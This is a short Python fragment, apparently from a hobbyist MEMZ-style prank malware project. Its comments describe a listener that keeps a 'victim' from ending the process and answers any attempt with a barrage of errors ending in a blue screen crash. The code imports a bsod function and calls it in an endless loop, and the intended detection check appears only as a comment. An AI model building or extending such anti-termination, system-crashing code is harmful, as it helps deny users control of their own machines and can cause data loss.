#this code will add a listener that makes sure the victim(even though this code is harmless) does not attempt to end the tast.
#if this happens, the code will launch a barrage of errors that will result in a BSOD
#this will likely be created into a seperate, larger project

from MEMZmain import bsod

while True:
  #if window main closed(possible restart):
    #run error code
    bsod()
